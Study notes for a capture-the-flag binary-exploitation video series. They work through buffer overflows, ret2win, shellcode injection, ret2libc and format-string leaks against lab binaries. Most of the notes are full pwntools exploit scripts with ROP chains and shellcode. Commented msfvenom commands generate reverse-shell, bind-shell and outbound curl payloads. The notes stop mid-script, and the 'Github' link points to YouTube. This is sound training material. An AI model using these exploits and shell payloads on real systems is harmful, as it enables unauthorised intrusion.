# CryptoCat Binary Exploitation Series
Video Series: https://www.youtube.com/watch?v=jrG1Gqatj7U&list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec94&index=2
Github: https://www.youtube.com/watch?v=i2ypCsB93gM


### Table of Contents: CryptoCat Binary Exploitation
   1.  Overwriting a Variable on the Stack
   2.  Overwriting Variables on the Stack
   2.  Return to Win (Ret2Win) Buffer Overflow
   4.  Ret2Win with Function Parameters (x86/x64)
   5.  Injecting Shellcode (Shellcraft/MSFVenom)
   6.  Return to Lib-C (ret2system/one_gadget)
   7.  Format String Vulnerabilities (printf)
   8.  Leak PIE (bypass) and Lib-C (ret2system)
   9.  Overwriting Global Offset Table (GOT) Entries with printf()
   10. Bypassing Stack Canaries (leak+write)

### Useful Notes for this Series

---------------------------------------------------------------------------------

**`%n` will cause the number of characters written so far to be stored into there
   corresponding function arguments**
+ Additional References: 
 - https://vickieli.dev/binary%20exploitation/format-string-vulnerabilities/
 - https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html
 - https://axcheron.github.io/exploit-101-format-strings/
+ pwnlib.fmtstr: https://docs.pwntools.com/en/stable/fmtstr.html
```
int num_char;
printf("11111%n", &num_char); //integer 5 will be stored into variable `numchar`
```

---------------------------------------------------------------------------------

**Keep in mind 32bit & 64 bit have DIFFERENT WAY IT HANDLES FUNCTION PARAMETERS**

---------------------------------------------------------------------------------

**Use `checksec` to see binary permissions**

---------------------------------------------------------------------------------

**See dynamic libraries associated with a binary**
```
ldd <binary> # grab the directory to dynamic library (like libc)

readelf -s <dir_to_lib> # example: `readelf -s /lib/i386-linux-gnu/libc.so.6 |  grep system`

strings -a -t x <dir_to_lib> | grep "search_term" # find target in library 
# example: `string -a -t x /lib/i386-linux-gnu/libc.so.6 |  grep "/bin/sh"`
```

---------------------------------------------------------------------------------

**Compiling Source With No Protections**
```
gcc code.c -o output -fno-stack-protector -z execstack -no-pie -m32
```

---------------------------------------------------------------------------------

**Disabling ASLR on Linux**
```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

---------------------------------------------------------------------------------

**Github Python Script using Ghidra**
Github: `liba2k/ghidra.py`
Example Use: `ghidra_auto <binary>`

---------------------------------------------------------------------------------

**Ghidra TIPS**
+ If using _Ghidra_, you'll see `== <seemingly_random_hex>`
 - Either look the `Listing` disassembly window...
 - Or _right-click -> Char:_ to convert in `Decompile` window
 
---------------------------------------------------------------------------------

**When a Function get called ...**
+ The `return pointer` is pushed onto the stack
 - so it knows where to return to 
+ Then the `function parameters` are pushed onto the stack
 
---------------------------------------------------------------------------------

## ==================================================================

## (1) Overwriting a Variable on the Stack
Files: https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/01-overwriting_stack_variables_part1

  1. Use `ltarce` while using executing the binary 
    + `ltarce ./login`
    + My input: `test`
    + Technically you can see the password here, but ignore this
    
  2. Give a large input and see if you get a _Segmentation Fault_
    + `./login`
    + `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa`
    
  3. Find the input length that triggers the _Segmentation Fault_
    + You can open the binary in _Ghidra_ or read the _source code_
      and see that the `array's length` is **6**
      
  4. Observe the binary with `pwndbg` and set a breakpoint right before the
     compare that you saw in the disassembly(_Ghidra_)
    + `cmp dword ptr [ebp - 0xc], 0`
    + Technically you find the hardcoded key in one of the registers
      (or at least a pointer to it), but we'll ignore this
    
  5. Use `pwntools` for exploit script
     ```
     from pwn import *
     
     # Start program
     io = process('./login')
     
     # Send string to overflow buffer
     io.sendlineafter(b':', b'AAAAAAA')
     
     # Receive output
     print(io.recvall().decode())
     ```



## ==================================================================

## (2) Overwriting Variables on the Stack
Files: https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/02-overwriting_stack_variables_part2

   1. Observe _source code_ or _Ghidra_ to see:
     + That there is an array of length `32`
     + That the **hard coded key** is `0xdeadbeef`
     + Could give binary pattern and observe the results, but this was easier 
     
   2. If using _Ghidra_, you'll see `== <seemingly_random_hex>`
     + Either look the `Listing` disassembly window...
     + Or _right-click -> Char:_ to convert in `Decompile` window
     
   3. You'll see that the variable `key` is right **after the buffer**
     + We're going to overflow and overwrite that variable
   
   4. Manual exploit: `python2 -c "print 32*'A' + '\xef\xbe\xad\xde'" > output`
      - format is because we're looking at a _little endian_ architecture
     + `gdb <binary>`
     + `pwndbg> run < output`
   
   5. `pwntools` exploit script 
     ```
      from pwn import *

      # Start program
      io = process('./overwrite')
      
      # Send string to overflow buffer
      io.sendlineafter(b'?', b'A' * 32 + p32(0xdeadbeef))
      
      # Receive output
      print(io.recvall().decode())
     ```
  
## ==================================================================

## (3) Return to Win (Ret2Win) Buffer Overflows
Files: https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/03-return_to_win

   1. Look at _source code_ and see the `scanf("%s", buffer);`
     + Overflow here
     
   2. Since **No ASLR/PIE** get the _address to_ the `hacked()` function 
     + `r2 ret2win`
     + `[]> aaa`
     + `[]> afl`
     + Get the address of `sym.hacked`
      - `0x08049182`
     
   3. Use `pwndbg`
     + Use `cyclic` to find the `EIP` offset (it's **28** in this case)
     
   4. Check a successful spacing: `python2 -c "print 'A'*28 + 'B'*4 + 'C'*32" > output`
     + Check this gdb 
     + `gdb <binary>`
     + `pwndbg> run < output`
     
   5. Manual Exploit with hardcoded address from step 2 above ()
     + `python2 -c "print 'A'*28 + '\x82\x91\x04\x08'" > output`
      - format is because we're looking at a _little endian_ architecture
     + `gdb <binary>`
     + `pwndbg> run < output`
     
     
### 6. Write Exploit Script
   ```exploit.py
      from pwn import *

      # Allows you to switch between local/GDB/remote from terminal
      def start(argv=[], *a, **kw):
          if args.GDB:  # Set GDBscript below
              return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
          elif args.REMOTE:  # ('server', 'port')
              return remote(sys.argv[1], sys.argv[2], *a, **kw)
          else:  # Run locally
              return process([exe] + argv, *a, **kw)
      
      # Specify your GDB script here for debugging
      gdbscript = '''
      init-pwndbg
      continue
      '''.format(**locals())
      
      # Set up pwntools for the correct architecture
      exe = './ret2win'
      # This will automatically get context arch, bits, os etc
      elf = context.binary = ELF(exe, checksec=False)
      # Change logging level to help with debugging (error/warning/info/debug)
      context.log_level = 'debug'
      
      # ===========================================================
      #                    EXPLOIT GOES HERE
      # ===========================================================
      
      io = start()
      
      # How many bytes to the instruction pointer (EIP)?
      padding = 28
      
      payload = flat(
          b'A' * 28,
          0x8049182 # elf.functions.hacked  # 0x401142
      )
      
      # Save the payload to file
      write('payload', payload)
      
      # Send the payload
      io.sendlineafter(b':', payload)
      
      # Receive the flag
      io.interactive()
   ```
   
### 7. Here is an automated script that uses ROP (return-oriented-programming)
   ```ropstar.py
      from pwn import *
      
      # Allows you to switch between local/GDB/remote from terminal
      def start(argv=[], *a, **kw):
          if args.GDB:  # Set GDBscript below
              return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
          elif args.REMOTE:  # ('server', 'port')
              return remote(sys.argv[1], sys.argv[2], *a, **kw)
          else:  # Run locally
              return process([exe] + argv, *a, **kw)
      
      # Specify your GDB script here for debugging
      gdbscript = '''
      init-pwndbg
      continue
      '''.format(**locals())
      
      # Set up pwntools for the correct architecture
      exe = './ret2win'
      # This will automatically get context arch, bits, os etc
      elf = context.binary = ELF(exe, checksec=False)
      # Change logging level to help with debugging (error/warning/info/debug)
      context.log_level = 'debug'
      
      # ===========================================================
      #                    EXPLOIT GOES HERE
      # ===========================================================
      
      io = start()
      
      # We will send a 'cyclic' pattern which overwrites the return address on the stack
      payload = cyclic(50)
      
      # PWN
      io.sendlineafter(b'Name:', payload)
      
      # Wait for the process to crash
      io.wait()
      
      # Open up the corefile
      core = io.corefile
      
      # Print out the address of EIP at the time of crashing
      eip_value = core.eip
      eip_offset = cyclic_find(eip_value)
      info('located EIP offset at {a}'.format(a=eip_offset))
      
      # Create ROP object
      rop = ROP(elf)
      # Call the hacked function
      rop.hacked()
      
      # Dump out the rop structure
      print(rop.dump())
      # pprint(rop.gadgets)
      
      # Get the raw bytes
      rop_chain = rop.chain()
      
      # Build payload
      payload = flat({
          eip_offset: rop_chain
      })
      
      # Save payload to file
      write('payload', payload)
      
      # Start a new process
      io = start()
      
      # PWN
      io.sendlineafter(b'Name:', payload)
      
      # Receive the flag
      io.interactive()
   ```

## ==================================================================

## (4) Ret2Win with Function Parameters (x86/x64)
Files: https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/04-ret2win_with_params

   1. Look at _source code_ and see the `scanf("%s", buffer);`
     + Overflow here
     
   2. Since **No ASLR/PIE** get the _address to_ the `hacked()` function 
     + `r2 ret2win`
     + `[]> aaa`
     + `[]> afl`
     + Get the address of `sym.hacked`
      - `0x08049182`
     
   3. Use `pwndbg`
     + Use `cyclic` to find the `EIP` offset (it's **28** in this case)
     
   4. Check a successful spacing: `python2 -c "print 'A'*28 + 'B'*4 + 'C'*32" > output`
     + Check this gdb 
     + `gdb <binary>`
     + `pwndbg> run < output`
     
   5. Manual Exploit with hardcoded address from step 2 above ()
     + `python2 -c "print 'A'*28 + '\x82\x91\x04\x08'" > output`
      - format is because we're looking at a _little endian_ architecture
     + `gdb <binary>`
     + `pwndbg> run < output`
     + You'll get a print statemend saying you're **unauthorized**
     
   6. However, this `hacked()` function takes in **2 function parameters**
     + If you look at _source code_ or _Ghidra_, you see:
       `if(first == 0xdeadbeef && second == 0xc0debabe){`
   
### 7.  Write exploit script that _provides these parameters_
      ```
      from pwn import *

      # Allows easy swapping betwen local/remote/debug modes
      def start(argv=[], *a, **kw):
          if args.GDB:  # Set GDBscript below
              return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
          elif args.REMOTE:  # ('server', 'port')
              return remote(sys.argv[1], sys.argv[2], *a, **kw)
          else:  # Run locally
              return process([exe] + argv, *a, **kw)
      
      
      def find_ip(payload):
          # Launch process and send payload
          p = process(exe)
          p.sendlineafter(b':', payload)
          # Wait for the process to crash
          p.wait()
          # Print out the address of EIP/RIP at the time of crashing
          ip_offset = cyclic_find(p.corefile.pc)  # x86
          # ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
          info('located EIP/RIP offset at {a}'.format(a=ip_offset))
          return ip_offset
      
      
      # Specify your GDB script here for debugging
      gdbscript = '''
      init-pwndbg
      continue
      '''.format(**locals())
      
      
      # Set up pwntools for the correct architecture
      exe = './ret2win_params'
      # This will automatically get context arch, bits, os etc
      elf = context.binary = ELF(exe, checksec=False)
      # Enable verbose logging so we can see exactly what is being sent (info/debug)
      context.log_level = 'debug'
      
      # ===========================================================
      #                    EXPLOIT GOES HERE
      # ===========================================================
      
      # Pass in pattern_size, get back EIP/RIP offset
      offset = find_ip(cyclic(200))
      
      # Start program
      io = start()
      
      # Build the payload
      payload = flat({
          offset: [
              # 32-bit the params follow the function
              elf.functions.hacked,
              0x0,  # Return pointer - try changing to main() and step through with GDB!
              0xdeadbeef,  # Param_1
              0xc0debabe,  # Param_2
          ]
      })
      
      # Save the payload to file
      write('payload', payload)
      
      # Send the payload
      io.sendlineafter(b':', payload)
      
      # Get flag
      io.interactive()
      ```
      
### 8.  Automated script that uses ROP 
      ```
      from pwn import *

      # Allows easy swapping betwen local/remote/debug modes
      def start(argv=[], *a, **kw):
          if args.GDB:  # Set GDBscript below
              return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
          elif args.REMOTE:  # ('server', 'port')
              return remote(sys.argv[1], sys.argv[2], *a, **kw)
          else:  # Run locally
              return process([exe] + argv, *a, **kw)
      
      def find_ip(payload):
          # Launch process and send payload
          p = process(exe)
          p.sendlineafter(b':', payload)
          # Wait for the process to crash
          p.wait()
          # Print out the address of EIP/RIP at the time of crashing
          ip_offset = cyclic_find(p.corefile.pc)  # x86
          # ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
          info('located EIP/RIP offset at {a}'.format(a=ip_offset))
          return ip_offset
      
      # Specify your GDB script here for debugging
      gdbscript = '''
      init-pwndbg
      continue
      '''.format(**locals())
      
      # Set up pwntools for the correct architecture
      exe = './ret2win_params'
      # This will automatically get context arch, bits, os etc
      elf = context.binary = ELF(exe, checksec=False)
      # Enable verbose logging so we can see exactly what is being sent (info/debug)
      context.log_level = 'debug'
      
      # ===========================================================
      #                    EXPLOIT GOES HERE
      # ===========================================================
      
      # Pass in pattern_size, get back EIP/RIP offset
      offset = find_ip(cyclic(200))
      
      # Start program
      io = start()
      
      # ROP object
      rop = ROP(elf)
      rop.hacked(0xdeadbeef, 0xc0debabe)
      
      # Build the payload
      payload = flat({
          offset: rop.chain()
      })
      
      # Save the payload to file
      write('payload', payload)
      
      # Send the payload
      io.sendlineafter(b':', payload)
      
      # Get flag
      io.interactive()     
      ```

### 9.  64 bit exploit script
      ```
      from pwn import *
      
      # Allows easy swapping betwen local/remote/debug modes
      def start(argv=[], *a, **kw):
          if args.GDB:  # Set GDBscript below
              return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
          elif args.REMOTE:  # ('server', 'port')
              return remote(sys.argv[1], sys.argv[2], *a, **kw)
          else:  # Run locally
              return process([exe] + argv, *a, **kw)
      
      
      def find_ip(payload):
          # Launch process and send payload
          p = process(exe)
          p.sendlineafter(b':', payload)
          # Wait for the process to crash
          p.wait()
          # Print out the address of EIP/RIP at the time of crashing
          # ip_offset = cyclic_find(p.corefile.pc)  # x86
          ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
          info('located EIP/RIP offset at {a}'.format(a=ip_offset))
          return ip_offset
      
      
      # Specify your GDB script here for debugging
      gdbscript = '''
      init-pwndbg
      continue
      '''.format(**locals())
      
      
      # Set up pwntools for the correct architecture
      exe = './ret2win_params'
      # This will automatically get context arch, bits, os etc
      elf = context.binary = ELF(exe, checksec=False)
      # Enable verbose logging so we can see exactly what is being sent (info/debug)
      context.log_level = 'debug'
      
      # ===========================================================
      #                    EXPLOIT GOES HERE
      # ===========================================================
      
      # Pass in pattern_size, get back EIP/RIP offset
      offset = find_ip(cyclic(200))
      
      # Start program
      io = start()
      
      # POP RDI gadget found with ropper
      pop_rdi = 0x40124b
      # POP RSI; POP R15 gadget found with ropper
      pop_rsi_r15 = 0x401249
      
      # Build the payload
      payload = flat({
          offset: [
              pop_rdi,  # Pop the next value to RDI
              0xdeadbeefdeadbeef,
              pop_rsi_r15,  # Pop the next value to RSI (and junk into R15)
              0xc0debabec0debabe,
              0x0,
              # With params in correct registers, call hacked function
              elf.functions.hacked
          ]
      })
      
      # Save the payload to file
      write('payload', payload)
      
      # Send the payload
      io.sendlineafter(b':', payload)
      
      # Get flag
      io.interactive()
      ```
### 10. 64 bit ropstar script
      ```
      from pwn import *
      
      # Allows easy swapping betwen local/remote/debug modes
      def start(argv=[], *a, **kw):
          if args.GDB:  # Set GDBscript below
              return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
          elif args.REMOTE:  # ('server', 'port')
              return remote(sys.argv[1], sys.argv[2], *a, **kw)
          else:  # Run locally
              return process([exe] + argv, *a, **kw)
      
      def find_ip(payload):
          # Launch process and send payload
          p = process(exe)
          p.sendlineafter(b':', payload)
          # Wait for the process to crash
          p.wait()
          # Print out the address of EIP/RIP at the time of crashing
          # ip_offset = cyclic_find(p.corefile.pc)  # x86
          ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
          info('located EIP/RIP offset at {a}'.format(a=ip_offset))
          return ip_offset
      
      # Specify your GDB script here for debugging
      gdbscript = '''
      init-pwndbg
      continue
      '''.format(**locals())
      
      # Set up pwntools for the correct architecture
      exe = './ret2win_params'
      # This will automatically get context arch, bits, os etc
      elf = context.binary = ELF(exe, checksec=False)
      # Enable verbose logging so we can see exactly what is being sent (info/debug)
      context.log_level = 'debug'
      
      # ===========================================================
      #                    EXPLOIT GOES HERE
      # ===========================================================
      
      # Pass in pattern_size, get back EIP/RIP offset
      offset = find_ip(cyclic(200))
      
      # Start program
      io = start()
      
      # ROP object
      rop = ROP(elf)
      rop.hacked(0xdeadbeefdeadbeef, 0xc0debabec0debabe)
      
      # Build the payload
      payload = flat({
          offset: rop.chain()
      })
      
      # Save the payload to file
      write('payload', payload)
      
      # Send the payload
      io.sendlineafter(b':', payload)
      
      # Get flag
      io.interactive()
      ```
      
## ==================================================================

## (5) Injecting Shellcode (Shellcraft/MSFVenom)
Files: https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/05-injecting_custom_shellcode

   1. You'll see `setuid(0);` and `setgid(0)` in _source code_
     + In Linux, 0 is the uid for root
     
   2. Do the usual stuff like above to find the offset and whatnot 
   
   3. Once you inject shellcode, you'll jump back to the stack to execute 
     + You'll use the `jmp esp to do this`
   
### 4. Use `shellcraft` to craft exploit 
     + `shellcraft i386.linux.sh -f a`
      - This formats the shellcode in assembly
     + shellcraft script 
     ```
      from pwn import *
      
      # Allows you to switch between local/GDB/remote from terminal
      def start(argv=[], *a, **kw):
          if args.GDB:  # Set GDBscript below
              return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
          elif args.REMOTE:  # ('server', 'port')
              return remote(sys.argv[1], sys.argv[2], *a, **kw)
          else:  # Run locally
              return process([exe] + argv, *a, **kw)
      
      # Specify GDB script here (breakpoints etc)
      gdbscript = '''
      init-pwndbg
      continue
      '''.format(**locals())
      
      # Binary filename
      exe = './server'
      # This will automatically get context arch, bits, os etc
      elf = context.binary = ELF(exe, checksec=False)
      # Change logging level to help with debugging (error/warning/info/debug)
      context.log_level = 'debug'
      
      # ===========================================================
      #                    EXPLOIT GOES HERE
      # ===========================================================
      
      io = start()
      
      # Offset to EIP
      padding = 76
      
      # Assemble the byte sequence for 'jmp esp' so we can search for it
      jmp_esp = asm('jmp esp')
      jmp_esp = next(elf.search(jmp_esp))
      
      # Print flag
      shellcode = asm(shellcraft.cat('flag.txt'))
      # shellcode = asm(shellcraft.sh())
      # Exit
      shellcode += asm(shellcraft.exit())
      
      # Build payload
      payload = flat(
          asm('nop') * padding,
          jmp_esp,
          asm('nop') * 16,
          shellcode
      )
      
      # Write payload to file
      write("payload", payload)
      
      # Exploit
      io.sendlineafter(b':', payload)
      
      # Get flag/shell
      io.interactive()
     ```

### 5. Use `msfvenom` to craft exploit
      ```
      from pwn import *
      
      # Allows you to switch between local/GDB/remote from terminal
      def start(argv=[], *a, **kw):
          if args.GDB:  # Set GDBscript below
              return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
          elif args.REMOTE:  # ('server', 'port')
              return remote(sys.argv[1], sys.argv[2], *a, **kw)
          else:  # Run locally
              return process([exe] + argv, *a, **kw)
      
      # Specify GDB script here (breakpoints etc)
      gdbscript = '''
      init-pwndbg
      continue
      '''.format(**locals())
      
      # Binary filename
      exe = './server'
      # This will automatically get context arch, bits, os etc
      elf = context.binary = ELF(exe, checksec=False)
      # Change logging level to help with debugging (error/warning/info/debug)
      context.log_level = 'debug'
      
      # ===========================================================
      #                    EXPLOIT GOES HERE
      # ===========================================================
      
      io = start()
      
      # Offset to EIP
      padding = 76
      
      # Assemble the byte sequence for 'jmp esp' so we can search for it
      jmp_esp = asm('jmp esp')
      jmp_esp = next(elf.search(jmp_esp))
      
      # msfvenom -p linux/x86/exec CMD="curl https://en4i3omt29wvgco.m.pipedream.net" -b '\x00' -f python
      # msfvenom -p linux/x86/shell_bind_tcp PORT=1337 -b '\x00' -f python
      # msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f python
      # msfvenom -p linux/x86/read_file PATH=flag.txt FD=2 -b '\x00' -f python
      
      # Exploit
      buf = b""
      buf += b"\xb8\xa4\xe4\x0d\x3b\xda\xd2\xd9\x74\x24\xf4\x5b\x31"
      buf += b"\xc9\xb1\x12\x31\x43\x14\x83\xc3\x04\x03\x43\x10\x46"
      buf += b"\x11\xe6\x0d\x3e\xdf\xf9\x71\x3e\xbb\xc8\xb8\xf3\xbb"
      buf += b"\xa2\xf8\xb3\xbf\xb4\xfe\xc3\x36\x53\x77\x3a\xf2\x9c"
      buf += b"\x98\xbc\x03\x50\x18\x35\xc1\xd2\x1d\x45\xc6\x22\xa5"
      buf += b"\x47\xc6\x22\xd9\x8a\x46\x9a\xd8\x14\x47\xdb\x61\x14"
      buf += b"\x47\xdb\x95\xd9\xc7\x33\x50\x1e\x38\x3c\x3d\x8c\xa6"
      buf += b"\xa4\xec\x38\x51\x5f\xf1"
      
      # Build payload
      payload = flat(
          asm('nop') * padding,
          jmp_esp,
          asm('nop') * 16,
          buf
      )
      
      # Write payload to file
      write("payload", payload)
      
      # Exploit
      io.sendlineafter(b':', payload)
      
      # Get flag/shell
      io.interactive()
      ```

## ==================================================================

## (6) Return to Lib-C (ret2system/one_gadget)
Files: https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/06-return_to_libc

**NX is ENABLED** (meaning I won't be able to execute on the stack)
**Look at video for the use of `one_gadget`**


   1. You'll see `setuid(0);` and `setgid(0);` in _source code_
     + In Linux, 0 is the uid for root
     
   2. Do the usual stuff like above to find the offset and whatnot 
   
   3. Once you inject shellcode, you'll jump back to the stack to execute 
     + You'll use the `jmp esp` to do this
     
   4. Check the `.got.plt` to see the address of the `gets()` function in _Ghidra_
     + **ASLR/PIE is disabled** in this example
     + _Disable ASLR for the system since libc is still randomized_
       `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`
     + You can use the `ldd` command to see dependencies
      - `ldd secureserver`
     
   5. Get the address to _system_ based on the _directory_ to 
      `libc` found in step 4's `ldd`
      ```example_command
      readelf -s <dir_to_lib> # example: `readelf -s /lib/i386-linux-gnu/libc.so.6 |  grep system`
      ```
   
   6. Get the _base address_ for `libc` library 
      `ldd secureserver` -> 0xf7dba000 
   
   7. Get the _offset_ to `system`
      `readelf -s /lib/i386-linux-gnu/libc.so.6 |  grep system` -> 00045040
     + Address to `system` is (based off step 7 & 8):
      - 0xf7dba000 + 0x00045040 = 0xf7dff040

   8. Find the _offset_ to `"/bin/sh"`
      `string -a -t x /lib/i386-linux-gnu/libc.so.6 |  grep "/bin/sh"` -> 18c338
   
### 9.  32 bit version of exploit script 
      ```
      from pwn import *
      
      
      # Allows you to switch between local/GDB/remote from terminal
      def start(argv=[], *a, **kw):
          if args.GDB:  # Set GDBscript below
              return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
          elif args.REMOTE:  # ('server', 'port')
              return remote(sys.argv[1], sys.argv[2], *a, **kw)
          else:  # Run locally
              return process([exe] + argv, *a, **kw)
      
      
      # Specify GDB script here (breakpoints etc)
      gdbscript = '''
      init-pwndbg
      continue
      '''.format(**locals())
      
      
      # Binary filename
      exe = './secureserver'
      # This will automatically get context arch, bits, os etc
      elf = context.binary = ELF(exe, checksec=False)
      # Change logging level to help with debugging (error/warning/info/debug)
      context.log_level = 'debug'
      
      # ===========================================================
      #                    EXPLOIT GOES HERE
      # ===========================================================
      
      io = start()
      
      # Lib-c offsets, found manually (ASLR_OFF)
      libc_base = 0xf7dba000
      system = libc_base + 0x45040
      binsh = libc_base + 0x18c338
      
      # How many bytes to the instruction pointer (EIP)?
      padding = 76
      
      payload = flat(
          asm('nop') * padding,  # Padding up to EIP
          system,  # Address of system function in libc
          0x0,  # Return pointer (cause this is x86)
          binsh  # Address of /bin/sh in libc (an argument)
      )
      
      # Write payload to file
      write('payload', payload)
      
      # Exploit
      io.sendlineafter(b':', payload)
      
      # Get flag/shell
      io.interactive()
      ```
      
### 10. 64 bit version of exploit script
      ```
      from pwn import *
      
      
      # Allows you to switch between local/GDB/remote from terminal
      def start(argv=[], *a, **kw):
          if args.GDB:  # Set GDBscript below
              return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
          elif args.REMOTE:  # ('server', 'port')
              return remote(sys.argv[1], sys.argv[2], *a, **kw)
          else:  # Run locally
              return process([exe] + argv, *a, **kw)
      
      
      # Specify GDB script here (breakpoints etc)
      gdbscript = '''
      init-pwndbg
      continue
      '''.format(**locals())
      
      
      # Binary filename
      exe = './secureserver'
      # This will automatically get context arch, bits, os etc
      elf = context.binary = ELF(exe, checksec=False)
      # Change logging level to help with debugging (error/warning/info/debug)
      context.log_level = 'debug'
      
      # ===========================================================
      #                    EXPLOIT GOES HERE
      # ===========================================================
      
      io = start()
      
      # Lib-c offsets, found manually (ASLR_OFF)
      libc_base = 0x7ffff7dde000
      system = libc_base + 0x48e50
      binsh = libc_base + 0x18a152
      
      # POP RDI gadget (found with ropper)
      pop_rdi = 0x40120b
      
      # How many bytes to the instruction pointer (RIP)?
      padding = 72
      
      payload = flat(
          asm('nop') * padding,  # Padding up to RIP
          pop_rdi,  # Pop the following address into the RDI register
          binsh,  # Address of /bin/sh in libc (in the RDI register as parameter)
          system,  # Address of system function in libc (to be executed)
      )
      
      # Write payload to file
      write('payload', payload)
      
      # Exploit
      io.sendlineafter(b':', payload)
      
      # Get flag/shell
      io.interactive()
      ```

## ==================================================================

## (7) Format String Vulnerabilities (printf)
Files: https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/07-format_string_vulns

+ Pwntools Format String Exploiter: https://docs.pwntools.com/en/stable/fmtstr.html
+ Additional References: 
 - https://vickieli.dev/binary%20exploitation/format-string-vulnerabilities/
 - https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html
 - https://axcheron.github.io/exploit-101-format-strings/

   1. Look at _source code_ and see the `printf(buf);`
     + It's taking arbitrary user input and _feeding it to `printf`_
   
   2. Run the binary and try format string input
      (`%p`/`%u`/`$x`/`%lx`/`%llx`/`%s`/`%10$x`/`%n`)
      to get a format string attack
   
### 3. Fuzz the String Format Issue 
    ```
    from pwn import *

    # This will automatically get context arch, bits, os etc
    elf = context.binary = ELF('./format_vuln', checksec=False)
    
    # Let's fuzz 100 values
    for i in range(100):
        try:
            # Create process (level used to reduce noise)
            p = process(level='error')
            # When we see the user prompt '>', format the counter
            # e.g. %2$s will attempt to print second pointer as string
            p.sendlineafter(b'> ', '%{}$s'.format(i).encode())
            # Receive the response
            result = p.recvuntil(b'> ')
            # Check for flag
            # if("flag" in str(result).lower()):
            print(str(i) + ': ' + str(result))
            # Exit the process
            p.close()
        except EOFError:
            pass
    ```


## ==================================================================

## (8) Leak PIE (bypass) and Lib-C (ret2system)
Files: https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/08-leak_pie_ret2libc

**ASLR/PIE & NX/DEP IS ENABLED** (no stack canary)
**While base address changes, the offset does NOT**

   1. If you look at _source code_ you'll see
     + `enter_name()` has a **string format vulnearbility**
      - `printf(name);`
     + `vuln();` has a **buffer overflow**
      - `gets(buffer);`

   2. Use `pwndbg` to get the **PIE Base Address**
     + `pwndbg> piebase`
     + `pwndbg> breakrva` - sets up a breakpoint at PIE base
      - `pwndbg> breakrva 0x<offset>` - sets up breakpoint at PIE base + offset 

   3. For the second input the binary asks use `cyclic` to get the offset
      to find the `RIP` 
     + Look at video 12:45 https://www.youtube.com/watch?v=NAUA1EB-TZg&list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec94&index=9
      
   4. Use `ropper` to get the `pop rdi` gadget
   
### 5. Fuzz application for useful information 
   + Addresses that start with `0x7f` might be external library 
   + Want to find an address where the **offset** is the same 
     each time I run this _fuzzer script_
      ```
      from pwn import *
      
      # Allows you to switch between local/GDB/remote from terminal
      def start(argv=[], *a, **kw):
          if args.GDB:  # Set GDBscript below
              return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
          elif args.REMOTE:  # ('server', 'port')
              return remote(sys.argv[1], sys.argv[2], *a, **kw)
          else:  # Run locally
              return process([exe] + argv, *a, **kw)
      
      # Specify your GDB script here for debugging
      gdbscript = '''
      init-pwndbg
      piebase
      continue
      '''.format(**locals())
      
      # Set up pwntools for the correct architecture
      exe = './pie_server'
      # This will automatically get context arch, bits, os etc
      elf = context.binary = ELF(exe, checksec=False)
      # Enable verbose logging so we can see exactly what is being sent (info/debug)
      context.log_level = 'warning'
      
      # ===========================================================
      #                    EXPLOIT GOES HERE
      # ===========================================================
      
      # Let's fuzz x values
      for i in range(100):
          try:
              p = start()
              # Format the counter
              # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
              p.sendlineafter(b':', '%{}$p'.format(i).encode())
              # Receive the response
              p.recvuntil(b'Hello ')
              result = p.recvline()
              print(str(i) + ': ' + str(result))
              p.close()
          except EOFError:
              pass
      ```


### 6. Look at video at 14:18
   + Look at video 14:18 https://www.youtube.com/watch?v=NAUA1EB-TZg&list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec94&index=9
   + `python fuzz.py GDB` - opens gdb after executing 
   + Take the `0x555...` address 
    - Get the PIE's base address (`pwndbg> piebase`)
    - Subtract the two to get the _offset_
     * `pwndbg> x 0x555...5295 - 0x555...4000`
### 7. Manual Exploit Script 
      ```
      from pwn import *
      
      # Allows you to switch between local/GDB/remote from terminal
      def start(argv=[], *a, **kw):
          if args.GDB:  # Set GDBscript below
              return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
          elif args.REMOTE:  # ('server', 'port')
              return remote(sys.argv[1], sys.argv[2], *a, **kw)
          else:  # Run locally
              return process([exe] + argv, *a, **kw)
      
      # Specify your GDB script here for debugging
      gdbscript = '''
      init-pwndbg
      continue
      '''.format(**locals())
      
      # Set up pwntools for the correct architecture
      exe = './pie_server'
      # This will automatically get context arch, bits, os etc
      elf = context.binary = ELF(exe, checksec=False)
      # Enable verbose logging so we can see exactly what is being sent (info/debug)
      context.log_level = 'debug'
      
      # ===========================================================
